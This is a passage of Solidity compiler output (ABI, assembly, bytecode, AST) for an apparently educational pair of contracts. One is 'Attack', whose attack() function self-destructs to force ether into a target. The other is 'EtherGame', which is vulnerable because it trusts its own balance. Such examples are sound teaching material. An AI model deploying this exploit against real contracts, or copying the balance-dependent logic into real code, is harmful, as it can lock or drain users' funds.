											"end": 982,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 843,
											"end": 982,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 843,
											"end": 982,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 895,
											"end": 915,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 934,
											"end": 943,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 934,
											"end": 943,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 934,
											"end": 943,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 956,
											"end": 974,
											"name": "SELFDESTRUCT",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.13+commit.abaa5c0e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract EtherGame\",\"name\":\"_etherGame\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/SelfDestructPrblem.sol\":\"Attack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":199},\"remappings\":[]},\"sources\":{\"contracts/SelfDestructPrblem.sol\":{\"keccak256\":\"0x6d75d45d9b106b15ad3461617a9030699bb9cbd392d00932f2a335d9f6c20beb\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://bc00841f86b28ec54b70a53b4643d6897b3c79268d8ff2292445d5b761c691a5\",\"dweb:/ipfs/QmP6Qh8xQWGMeDQCStLhZQrXTZytcYu8M4ePfWATM4hQTw\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 78,
								"contract": "contracts/SelfDestructPrblem.sol:Attack",
								"label": "etherGame",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(EtherGame)75"
							}
						],
						"types": {
							"t_contract(EtherGame)75": {
								"encoding": "inplace",
								"label": "contract EtherGame",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"EtherGame": {
					"abi": [
						{
							"inputs": [],
							"name": "claimReward",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "deposit",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "targetAmount",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "winner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/SelfDestructPrblem.sol\":62:694  contract EtherGame {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/SelfDestructPrblem.sol\":115:122  7 ether */\n  0x6124fee993bc0000\n    /* \"contracts/SelfDestructPrblem.sol\":88:122  uint public targetAmount = 7 ether */\n  0x00\n  sstore\n    /* \"contracts/SelfDestructPrblem.sol\":62:694  contract EtherGame {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/SelfDestructPrblem.sol\":62:694  contract EtherGame {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x953b8fb8\n      eq\n      tag_2\n      jumpi\n      dup1\n      0xb88a802f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd0e30db0\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xdfbf53ae\n      eq\n      tag_5\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"contracts/SelfDestructPrblem.sol\":88:122  uint public targetAmount = 7 ether */\n    tag_2:\n      callvalue\n      dup1\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      pop\n      tag_7\n      sload(0x00)\n      dup2\n      jump\n    tag_7:\n      mload(0x40)\n        /* \"#utility.yul\":160:185   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":148:150   */\n      0x20\n        /* \"#utility.yul\":133:151   */\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":88:122  uint public targetAmount = 7 ether */\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/SelfDestructPrblem.sol\":473:691  function claimReward() public {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"contracts/SelfDestructPrblem.sol\":159:465  function deposit() public payable {... */\n    tag_4:\n      tag_12\n      tag_15\n      jump\t// in\n        /* \"contracts/SelfDestructPrblem.sol\":129:150  address public winner */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      sload(0x01)\n      tag_17\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n    tag_17:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":360:392   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":342:393   */\n      dup2\n      mstore\n        /* \"#utility.yul\":330:332   */\n      0x20\n        /* \"#utility.yul\":315:333   */\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":129:150  address public winner */\n      tag_9\n        /* \"#utility.yul\":196:399   */\n      jump\n        /* \"contracts/SelfDestructPrblem.sol\":473:691  function claimReward() public {... */\n    tag_13:\n        /* \"contracts/SelfDestructPrblem.sol\":536:542  winner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x01))\n        /* \"contracts/SelfDestructPrblem.sol\":522:532  msg.sender */\n      caller\n        /* \"contracts/SelfDestructPrblem.sol\":522:542  msg.sender == winner */\n      eq\n        /* \"contracts/SelfDestructPrblem.sol\":514:557  require(msg.sender == winner, \"Not winner\") */\n      tag_22\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":606:608   */\n      0x20\n        /* \"contracts/SelfDestructPrblem.sol\":514:557  require(msg.sender == winner, \"Not winner\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":588:609   */\n      mstore\n        /* \"#utility.yul\":645:647   */\n      0x0a\n        /* \"#utility.yul\":625:643   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":618:648   */\n      mstore\n      shl(0xb1, 0x2737ba103bb4b73732b9)\n        /* \"#utility.yul\":664:682   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":657:697   */\n      mstore\n        /* \"#utility.yul\":714:732   */\n      0x64\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":514:557  require(msg.sender == winner, \"Not winner\") */\n    tag_23:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_22:\n        /* \"contracts/SelfDestructPrblem.sol\":586:635  msg.sender.call{value: address(this).balance}(\"\") */\n      mload(0x40)\n        /* \"contracts/SelfDestructPrblem.sol\":571:580  bool sent */\n      0x00\n      swap1\n        /* \"contracts/SelfDestructPrblem.sol\":586:596  msg.sender */\n      caller\n      swap1\n        /* \"contracts/SelfDestructPrblem.sol\":609:630  address(this).balance */\n      selfbalance\n      swap1\n        /* \"contracts/SelfDestructPrblem.sol\":571:580  bool sent */\n      dup4\n        /* \"contracts/SelfDestructPrblem.sol\":586:635  msg.sender.call{value: address(this).balance}(\"\") */\n      dup2\n        /* \"contracts/SelfDestructPrblem.sol\":571:580  bool sent */\n      dup2\n        /* \"contracts/SelfDestructPrblem.sol\":586:635  msg.sender.call{value: address(this).balance}(\"\") */\n      dup2\n        /* \"contracts/SelfDestructPrblem.sol\":609:630  address(this).balance */\n      dup6\n        /* \"contracts/SelfDestructPrblem.sol\":586:596  msg.sender */\n      dup8\n        /* \"contracts/SelfDestructPrblem.sol\":586:635  msg.sender.call{value: address(this).balance}(\"\") */\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_29\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_28)\n    tag_29:\n      0x60\n      swap2\n      pop\n    tag_28:\n      pop\n        /* \"contracts/SelfDestructPrblem.sol\":570:635  (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"contracts/SelfDestructPrblem.sol\":654:658  sent */\n      dup1\n        /* \"contracts/SelfDestructPrblem.sol\":646:683  require(sent, \"Failed to send Ether\") */\n      tag_30\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":1155:1157   */\n      0x20\n        /* \"contracts/SelfDestructPrblem.sol\":646:683  require(sent, \"Failed to send Ether\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1137:1158   */\n      mstore\n        /* \"#utility.yul\":1194:1196   */\n      0x14\n        /* \"#utility.yul\":1174:1192   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1167:1197   */\n      mstore\n      shl(0x61, 0x2330b4b632b2103a379039b2b7321022ba3432b9)\n        /* \"#utility.yul\":1213:1231   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":1206:1256   */\n      mstore\n        /* \"#utility.yul\":1273:1291   */\n      0x64\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":646:683  require(sent, \"Failed to send Ether\") */\n      tag_23\n        /* \"#utility.yul\":953:1297   */\n      jump\n        /* \"contracts/SelfDestructPrblem.sol\":646:683  require(sent, \"Failed to send Ether\") */\n    tag_30:\n        /* \"contracts/SelfDestructPrblem.sol\":503:691  {... */\n      pop\n        /* \"contracts/SelfDestructPrblem.sol\":473:691  function claimReward() public {... */\n      jump\t// out\n        /* \"contracts/SelfDestructPrblem.sol\":159:465  function deposit() public payable {... */\n    tag_15:\n        /* \"contracts/SelfDestructPrblem.sol\":212:221  msg.value */\n      callvalue\n        /* \"contracts/SelfDestructPrblem.sol\":225:232  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/SelfDestructPrblem.sol\":212:232  msg.value == 1 ether */\n      eq\n        /* \"contracts/SelfDestructPrblem.sol\":204:262  require(msg.value == 1 ether, \"You can only send 1 Ether\") */\n      tag_34\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":1504:1506   */\n      0x20\n        /* \"contracts/SelfDestructPrblem.sol\":204:262  require(msg.value == 1 ether, \"You can only send 1 Ether\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1486:1507   */\n      mstore\n        /* \"#utility.yul\":1543:1545   */\n      0x19\n        /* \"#utility.yul\":1523:1541   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1516:1546   */\n      mstore\n        /* \"#utility.yul\":1582:1609   */\n      0x596f752063616e206f6e6c792073656e64203120457468657200000000000000\n        /* \"#utility.yul\":1562:1580   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":1555:1610   */\n      mstore\n        /* \"#utility.yul\":1627:1645   */\n      0x64\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":204:262  require(msg.value == 1 ether, \"You can only send 1 Ether\") */\n      tag_23\n        /* \"#utility.yul\":1302:1651   */\n      jump\n        /* \"contracts/SelfDestructPrblem.sol\":204:262  require(msg.value == 1 ether, \"You can only send 1 Ether\") */\n    tag_34:\n        /* \"contracts/SelfDestructPrblem.sol\":275:287  uint balance */\n      0x00\n        /* \"contracts/SelfDestructPrblem.sol\":341:353  targetAmount */\n      sload\n        /* \"contracts/SelfDestructPrblem.sol\":290:311  address(this).balance */\n      selfbalance\n      swap1\n        /* \"contracts/SelfDestructPrblem.sol\":330:353  balance <= targetAmount */\n      dup2\n      gt\n      iszero\n        /* \"contracts/SelfDestructPrblem.sol\":322:370  require(balance <= targetAmount, \"Game is over\") */\n      tag_37\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":1858:1860   */\n      0x20\n        /* \"contracts/SelfDestructPrblem.sol\":322:370  require(balance <= targetAmount, \"Game is over\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1840:1861   */\n      mstore\n        /* \"#utility.yul\":1897:1899   */\n      0x0c\n        /* \"#utility.yul\":1877:1895   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1870:1900   */\n      mstore\n      shl(0xa1, 0x23b0b6b29034b99037bb32b9)\n        /* \"#utility.yul\":1916:1934   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":1909:1951   */\n      mstore\n        /* \"#utility.yul\":1968:1986   */\n      0x64\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":322:370  require(balance <= targetAmount, \"Game is over\") */\n      tag_23\n        /* \"#utility.yul\":1656:1992   */\n      jump\n        /* \"contracts/SelfDestructPrblem.sol\":322:370  require(balance <= targetAmount, \"Game is over\") */\n    tag_37:\n        /* \"contracts/SelfDestructPrblem.sol\":398:410  targetAmount */\n      sload(0x00)\n        /* \"contracts/SelfDestructPrblem.sol\":387:394  balance */\n      dup2\n        /* \"contracts/SelfDestructPrblem.sol\":387:410  balance == targetAmount */\n      sub\n        /* \"contracts/SelfDestructPrblem.sol\":383:458  if (balance == targetAmount) {... */\n      tag_30\n      jumpi\n        /* \"contracts/SelfDestructPrblem.sol\":427:433  winner */\n      0x01\n        /* \"contracts/SelfDestructPrblem.sol\":427:446  winner = msg.sender */\n      dup1\n      sload\n      not(sub(shl(0xa0, 0x01), 0x01))\n      and\n        /* \"contracts/SelfDestructPrblem.sol\":436:446  msg.sender */\n      caller\n        /* \"contracts/SelfDestructPrblem.sol\":427:446  winner = msg.sender */\n      or\n      swap1\n      sstore\n        /* \"contracts/SelfDestructPrblem.sol\":193:465  {... */\n      pop\n        /* \"contracts/SelfDestructPrblem.sol\":159:465  function deposit() public payable {... */\n      jump\t// out\n\n    auxdata: 0xa264697066735822122034205799ed3fe3af50765ebc66e8305e814b84eecb0569e88df7b4ccd66af4aa64736f6c634300080d0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "6080604052676124fee993bc000060005534801561001c57600080fd5b506102908061002c6000396000f3fe60806040526004361061003f5760003560e01c8063953b8fb814610044578063b88a802f1461006d578063d0e30db014610084578063dfbf53ae1461008c575b600080fd5b34801561005057600080fd5b5061005a60005481565b6040519081526020015b60405180910390f35b34801561007957600080fd5b506100826100c4565b005b6100826101a2565b34801561009857600080fd5b506001546100ac906001600160a01b031681565b6040516001600160a01b039091168152602001610064565b6001546001600160a01b031633146101105760405162461bcd60e51b815260206004820152600a6024820152692737ba103bb4b73732b960b11b60448201526064015b60405180910390fd5b604051600090339047908381818185875af1925050503d8060008114610152576040519150601f19603f3d011682016040523d82523d6000602084013e610157565b606091505b505090508061019f5760405162461bcd60e51b81526020600482015260146024820152732330b4b632b2103a379039b2b7321022ba3432b960611b6044820152606401610107565b50565b34670de0b6b3a7640000146101f95760405162461bcd60e51b815260206004820152601960248201527f596f752063616e206f6e6c792073656e642031204574686572000000000000006044820152606401610107565b600054479081111561023c5760405162461bcd60e51b815260206004820152600c60248201526b23b0b6b29034b99037bb32b960a11b6044820152606401610107565b600054810361019f57600180546001600160a01b031916331790555056fea264697066735822122034205799ed3fe3af50765ebc66e8305e814b84eecb0569e88df7b4ccd66af4aa64736f6c634300080d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH8 0x6124FEE993BC0000 PUSH1 0x0 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x1C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x290 DUP1 PUSH2 0x2C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x953B8FB8 EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0xB88A802F EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0x84 JUMPI DUP1 PUSH4 0xDFBF53AE EQ PUSH2 0x8C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5A PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x79 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x82 PUSH2 0xC4 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x82 PUSH2 0x1A2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x98 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 SLOAD PUSH2 0xAC SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x64 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x110 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x2737BA103BB4B73732B9 PUSH1 0xB1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x0 SWAP1 CALLER SWAP1 SELFBALANCE SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x152 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x157 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x19F JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x2330B4B632B2103A379039B2B7321022BA3432B9 PUSH1 0x61 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST POP JUMP JUMPDEST CALLVALUE PUSH8 0xDE0B6B3A7640000 EQ PUSH2 0x1F9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x19 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x596F752063616E206F6E6C792073656E64203120457468657200000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST PUSH1 0x0 SLOAD SELFBALANCE SWAP1 DUP2 GT ISZERO PUSH2 0x23C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xC PUSH1 0x24 DUP3 ADD MSTORE PUSH12 0x23B0B6B29034B99037BB32B9 PUSH1 0xA1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 SUB PUSH2 0x19F JUMPI PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER OR SWAP1 SSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLVALUE KECCAK256 JUMPI SWAP10 0xED EXTCODEHASH 0xE3 0xAF POP PUSH23 0x5EBC66E8305E814B84EECB0569E88DF7B4CCD66AF4AA64 PUSH20 0x6F6C634300080D00330000000000000000000000 ",
							"sourceMap": "62:632:0:-:0;;;115:7;88:34;;62:632;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@claimReward_74": {
									"entryPoint": 196,
									"id": 74,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@deposit_43": {
									"entryPoint": 418,
									"id": 43,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@targetAmount_4": {
									"entryPoint": null,
									"id": 4,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@winner_6": {
									"entryPoint": null,
									"id": 6,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_7f7f9c6d78507162a8bd16acc136c0b03c63c36f951fc71dd07575081ba76683__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_b2565c271bc1f6e9f3596c175513ca104086dfb78cd7419cc09c2779417406d9__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_bdc864de34e46c040c4d730398f4acbd8b64d0b5023c3fd84e9cf74a6ae62165__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1994:1",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:1",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "115:76:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "125:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "137:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "148:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "133:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "133:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "125:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "167:9:1"
																	},
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "178:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "160:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "160:25:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "160:25:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "84:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "95:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "106:4:1",
														"type": ""
													}
												],
												"src": "14:177:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "297:102:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "307:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "319:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "330:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "315:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "315:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "307:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "349:9:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "364:6:1"
																			},
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "380:3:1",
																								"type": "",
																								"value": "160"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "385:1:1",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "shl",
																							"nodeType": "YulIdentifier",
																							"src": "376:3:1"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "376:11:1"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "389:1:1",
																						"type": "",
																						"value": "1"
																					}
																				],
																				"functionName": {
																					"name": "sub",
																					"nodeType": "YulIdentifier",
																					"src": "372:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "372:19:1"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "360:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "360:32:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "342:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "342:51:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "342:51:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "266:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "277:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "288:4:1",
														"type": ""
													}
												],
												"src": "196:203:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "578:160:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "595:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "606:2:1",
